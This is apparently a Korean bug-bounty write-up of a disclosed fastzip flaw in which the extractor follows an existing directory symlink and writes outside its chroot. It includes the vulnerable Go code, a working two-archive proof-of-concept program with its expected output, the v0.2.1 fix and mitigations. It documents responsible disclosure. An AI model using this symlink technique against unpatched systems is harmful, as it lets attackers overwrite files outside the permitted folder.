---
{"title":"FastZip - Extractor writes outside the chroot through a symbolic link already present in the destination","date":"2026-11-18","category":"bug-bounty","tags":["FastZip","취약점 제보"],"summary":"FastZip 취약점 제보","section":[]}
---

# fastzip 압축 해제 시 기존 심볼릭 링크를 통한 chroot 탈출

## 링크

- 공개 어드바이저리: https://github.com/saracen/fastzip/security/advisories/GHSA-8gwq-33fg-g56p
- 저장소: https://github.com/saracen/fastzip
- 수정 PR: https://github.com/saracen/fastzip/pull/57 (커밋 `99c2a5c`)
- 릴리스: https://github.com/saracen/fastzip/releases/tag/v0.2.1
- GHSA: `GHSA-8gwq-33fg-g56p`
- 공개일: 2026-11-16

## 결과

- 심각도: Moderate
- CVSS 3.1: `5.9`
- 벡터: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N`
- 영향 버전: `< 0.2.1`
- 패치 버전: `0.2.1` (Go 1.25 이상 필요)
- CVE: 요청 중 (작성일 기준 미발급)
- CWE: CWE-22 (Path Traversal), CWE-59 (Link Following)
- 크레딧: `real-kicktheball`, `jamesb5959` — Reporter (각각 독립 제보)

## 타켓

이번에 FastZip으로 타켓을 정한 이유는, 전에 취약점 분석을 했을때 go를 기반으로 만든 오픈소스에서 취약점 분석을 성공했던 경험이 있어서 go기반 오픈소스를 탐색하다가 발견하게 되었다.

## 요약

> “등교할 때 학교의 공식적인 통로인 정문이나 후문을 통해서 들어가야 하는데, 몰래 개구멍을 통해 들어가는 취약점”

fastzip의 `Extractor.Extract`는 각 엔트리 경로가 chroot 안에 있는지 문자열로만 검사한 뒤, 경로 기반 `os` 함수로 파일, 디렉터리, 심볼릭 링크를 만들었다. 경로 기반 함수는 chroot 안에 이미 있는 디렉터리 심볼릭 링크를 그대로 따라가기 때문에, 이전 해제에서 남은 링크나 공유 폴더에 있던 링크가 chroot 밖을 가리키면 이후 엔트리가 chroot 밖에 기록된다. 이때 `Extract`는 오류를 반환하지 않는다. 권한, 시간, 소유권 설정도 같은 방식으로 chroot 밖에 적용된다.

압축기(Archiver)는 영향을 받지 않는다.

## 개념

### 압축 파일(ZIP) 이란?

여러 개의 파일을 하나의 파일로 만들어 놓은것이다.

### fastzip 이란?

압축된 파일을 아주 빨리 열어주는 Go 기반 언어 라이브러리이다. GitLab Runner 또한 이 라이브러리를 사용한다.

### chroot 이란?

압축을 풀 때 파일을 꺼내 놓아도 되는 폴더로 정해 둔 곳이다. 이 폴더 밖에 파일이 생기면 다른 프로그램이나 시스템 파일을 망가뜨릴 수 있기 때문에 밖으로 나가지 못하게 막아야 한다.

### 심볼릭 링크(symlink) 란?

다른 위치를 가리키는 바로가기 같은 것이다. 겉으로는 폴더 안의 평범한 폴더처럼 보이지만, 들어가면 전혀 다른 위치로 연결된다.

```text
dest/
 └─ link  ─────▶  outside/
```

## 분석 방법

압축을 헤재할 때 발생할 수 있는 취약점은 정해진 위치가 아니라 다른 위치에 압축을 해제하면서 파일을 덮어 씌우거나 자동 프로그램에 들어가게 할 수 있다. 따라서 압축할 때 사용한 코드보다 압축 해제 할 때의 코드를 집중적으로 분석했다.

## 취약 코드

파일: `extractor.go` (v0.2.0)

함수: `Extract`

```go
// 1) 문자열로만 검사
path, err = filepath.Abs(filepath.Join(e.chroot, file.Name))
if !strings.HasPrefix(path, e.chroot+string(filepath.Separator)) && path != e.chroot {
    return fmt.Errorf("%s cannot be extracted outside of chroot (%s)", path, e.chroot)
}

// 2) 경로 기반 os 호출로 실제 생성 → 중간의 심볼릭 링크를 OS가 따라감
if err := os.MkdirAll(filepath.Dir(path), 0777); err != nil {
    return err
}
```

`createFile`은 `os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666)`으로 파일을 만들고, `updateFileMetadata`는 같은 경로에 권한, 시간, 소유권을 설정한다.

`filepath.Join`과 `HasPrefix`는 디스크에 실제로 무엇이 있는지 보지 않는다. 반면 `os.OpenFile`, `os.MkdirAll`, `os.Chmod`, `os.Chtimes`, `os.Lchown`은 OS가 경로를 하나씩 해석하므로, 중간의 `link`가 디렉터리 심볼릭 링크이면 그 대상 위치에 쓴다. 검사한 경로와 실제로 접근하는 경로가 달라지는 것이 원인이다.

같은 압축 파일 안의 심볼릭 링크는 마지막에 만들도록 되어 있어서, 압축 파일 하나만으로는 공격이 성립하지 않는다.

```go
case file.Mode()&os.ModeSymlink != 0:
    // defer the creation of symlinks
    // this is to prevent a traversal vulnerability where a symlink is
    // first created and then files are additional extracted into it
    continue
```

하지만 이 방어는 이미 디스크에 남아 있는 링크는 막지 못한다. 1번 압축 파일로 링크를 남기고 2번 압축 파일로 그 링크를 통해 쓰면 chroot를 벗어난다.

## 최소 재현

임시 폴더 안에 `dest`(chroot)와 `outside`(외부 폴더)를 만든다. 1번 압축 파일로 `link → outside` 심볼릭 링크를 만들고, 2번 압축 파일로 `link/pwned.txt`를 해제한다.

```bash
mkdir fastzip-poc && cd fastzip-poc
go mod init poc
go get github.com/saracen/fastzip@v0.2.0
```

`main.go`:

```go
package main

import (
	"archive/zip"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/saracen/fastzip"
)

// makeZip은 entries(이름 → 내용)로 ZIP을 만든다.
// symlinks에 있는 이름은 심볼릭 링크로 저장되고, 내용은 링크 대상 경로가 된다.
func makeZip(zipPath string, entries map[string]string, symlinks map[string]bool) {
	f, err := os.Create(zipPath)
	must(err)
	defer f.Close()

	zw := zip.NewWriter(f)
	for name, content := range entries {
		hdr := &zip.FileHeader{Name: name, Method: zip.Store}
		if symlinks[name] {
			hdr.SetMode(os.ModeSymlink | 0o777)
		} else {
			hdr.SetMode(0o644)
		}
		w, err := zw.CreateHeader(hdr)
		must(err)
		_, err = w.Write([]byte(content))
		must(err)
	}
	must(zw.Close())
}

func extract(zipPath, dest string) error {
	e, err := fastzip.NewExtractor(zipPath, dest)
	if err != nil {
		return err
	}
	defer e.Close()
	return e.Extract(context.Background())
}

func main() {
	base, err := os.MkdirTemp("", "fastzip-poc-")
	must(err)
	base, _ = filepath.EvalSymlinks(base) // macOS의 /var → /private/var 대비
	dest := filepath.Join(base, "dest")
	outside := filepath.Join(base, "outside")
	must(os.MkdirAll(dest, 0o755))
	must(os.MkdirAll(outside, 0o755))

	fmt.Println("[*] base   :", base)
	fmt.Println("[*] dest   :", dest)
	fmt.Println("[*] outside:", outside)

	stage1 := filepath.Join(base, "stage1.zip")
	makeZip(stage1,
		map[string]string{"link": outside},
		map[string]bool{"link": true})

	stage2 := filepath.Join(base, "stage2.zip")
	makeZip(stage2,
		map[string]string{"link/pwned.txt": "hello from outside the chroot!\n"},
		nil)

	fmt.Println("[1] stage1.zip 해제 (심볼릭 링크 생성)")
	if err := extract(stage1, dest); err != nil {
		fmt.Println("    오류:", err)
		return
	}

	fmt.Println("[2] stage2.zip 해제 (링크를 통해 파일 쓰기)")
	err = extract(stage2, dest)
	if err != nil {
		fmt.Println("    오류:", err)
		if strings.Contains(err.Error(), "escape") || strings.Contains(err.Error(), "outside") {
			fmt.Println("[+] 차단됨. 패치된 버전이다.")
		}
		return
	}
	fmt.Println("    Extract() 반환값: nil (오류 없음)")

	data, err := os.ReadFile(filepath.Join(outside, "pwned.txt"))
	if err == nil {
		fmt.Println("[!] 취약: chroot 밖에 파일 생성됨:", filepath.Join(outside, "pwned.txt"))
		fmt.Print("    내용: ", string(data))
	} else {
		fmt.Println("[+] outside에 파일 없음")
	}
}

func must(err error) {
	if err != nil {
		panic(err)
	}
}
```

실행 명령:

```bash
go run .
```

기대 결과 (v0.2.0):

```text
[*] base   : /tmp/fastzip-poc-123456
[*] dest   : /tmp/fastzip-poc-123456/dest
[*] outside: /tmp/fastzip-poc-123456/outside
[1] stage1.zip 해제 (심볼릭 링크 생성)
[2] stage2.zip 해제 (링크를 통해 파일 쓰기)
    Extract() 반환값: nil (오류 없음)
[!] 취약: chroot 밖에 파일 생성됨: /tmp/fastzip-poc-123456/outside/pwned.txt
    내용: hello from outside the chroot!
```

패치 확인 (v0.2.1, Go 1.25 이상):

```bash
go get github.com/saracen/fastzip@v0.2.1
go run .
```

2단계에서 `fastzip.ErrSymlinkEscapesChroot`를 감싼 오류가 반환되고 `outside/pwned.txt`는 생성되지 않아야 한다. 이 값은 v0.2.1에만 있어서, 두 버전 모두에서 컴파일되도록 PoC에서는 오류 문자열로 확인했다.

> 메모: v0.2.0 소스를 기준으로 작성했고 아직 직접 실행하지 않았다. 실행 후 기대 결과를 관찰 결과로 바꿀 것. Windows는 심볼릭 링크 생성에 관리자 권한이나 개발자 모드가 필요하므로 Linux나 macOS에서 실행한다.

## 영향

- 해제하는 프로세스가 쓸 수 있는 곳이면 어디든 파일을 새로 만들거나 덮어쓸 수 있다.
- 엔트리에 지정된 권한, 시간, 소유권이 chroot 밖 파일에 적용된다.
- 정보 유출(기밀성)이나 서비스 중단(가용성)에 대한 직접적인 영향은 없다.

공격이 성립하려면 해제 폴더 안에 chroot 밖을 가리키는 디렉터리 심볼릭 링크가 미리 있어야 한다. 이런 링크는 다음 경우에 생길 수 있다.

- 같은 폴더에 이전에 해제한 압축 파일이 남긴 링크
- 여러 작업이 함께 쓰거나 재사용하는 해제 폴더 (예: CI 러너의 캐시/아티팩트 폴더)
- 다른 경로로 해제 폴더에 쓸 수 있는 경우

이 조건 때문에 공격 난이도가 High(AC:H)로 평가되어 Moderate 등급이다.

GitLab Runner가 fastzip을 사용하며, 권고문에 따르면 GitLab Runner는 자체적으로 `os.Root` 기반 격리를 적용해 대응했다.

- GitLab Runner MR: https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/7500
- GitLab Runner 이슈: https://gitlab.com/gitlab-org/gitlab-runner/-/work_items/39687

## 적용된 수정

v0.2.1 (PR #57)에서 다음과 같이 수정되었다.

- chroot를 `os.Root`로 열고 모든 파일시스템 작업을 그 기준으로 수행한다. 경로 중간의 심볼릭 링크가 chroot 밖으로 나가면 링크 이름과 함께 `fastzip.ErrSymlinkEscapesChroot`를 감싼 오류를 반환한다.
- 엔트리를 쓸 위치에 심볼릭 링크나 일반 파일이 이미 있으면 그것을 통해 쓰지 않고 교체한다.
- 심볼릭 링크 자체의 시간과 권한은 부모 디렉터리 디스크립터 기준으로 설정해 우회할 수 없게 했다.
- `os.Root.Chmod`는 setuid, setgid, sticky 비트를 적용하므로, 기존처럼 일반 권한 비트만 적용하도록 마스킹했다.
- `WithExtractorSymlinkPolicy(SymlinkPolicyContain)` 옵션을 추가했다. 대상이 절대경로이거나 chroot 밖으로 해석되는 링크 엔트리를 거부한다. 기본 정책은 기존처럼 링크를 저장된 그대로 만든다.
- `os.Root`의 `Symlink`, `Chmod`, `Chtimes`, `Lchown`, `MkdirAll`이 Go 1.25에서 추가되어 최소 Go 버전을 1.25로 올렸다.

문서화된 한계:

- 디스크에 이미 있는 절대경로 심볼릭 링크는 chroot 안을 가리키더라도 통과할 수 없다.
- Windows에서 chroot 밖 디렉터리를 가리키는 링크 엔트리는 파일 링크로 생성된다.

업그레이드할 수 없는 경우의 완화 방안:

- 새로 만든 빈 폴더에 해제한다.
- 해제 전에 대상 폴더의 심볼릭 링크를 제거한다.
- 호출하는 쪽에서 `os.Root` 기반 격리를 적용한다 (GitLab Runner 방식).

## 분류 관련 메모

공개 어드바이저리는 CWE-22, CWE-59와 Moderate(5.9)로 분류했다. CVE는 메인테이너가 요청했으며 아직 발급되지 않았다. 두 제보자가 각각 독립적으로 제보했고 어드바이저리에 모두 크레딧이 부여되었다.

## 타임라인

- 최초 제보 (real-kicktheball): 2026-10-03
- 독립 제보 (jamesb5959): 2026-10-20
- 수정 PR #57 머지, v0.2.1 릴리스: 2026-11-16
- 공개 및 CVE 요청: 2026-11-16
